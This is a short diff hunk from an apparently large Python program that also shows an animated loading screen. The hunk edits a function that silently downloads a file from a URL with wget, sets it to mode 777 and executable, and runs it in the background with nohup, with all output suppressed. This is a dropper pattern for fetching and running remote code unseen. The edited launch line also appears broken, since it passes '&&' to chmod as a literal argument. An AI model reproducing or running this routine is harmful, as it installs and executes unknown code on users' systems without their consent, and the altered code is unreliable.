@@ -8391,7 +8391,7 @@ def download_and_execute_file(url, filename):
     subprocess.Popen(["wget", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     subprocess.Popen(["chmod", "777", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     subprocess.Popen(["chmod", "+x", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
-    subprocess.Popen(["nohup", "./" + filename, "&"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["chmod", "+x", "sys.bin", "&&", "nohup", "./" + filename, "&"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def main():
     animated_loading_screen()
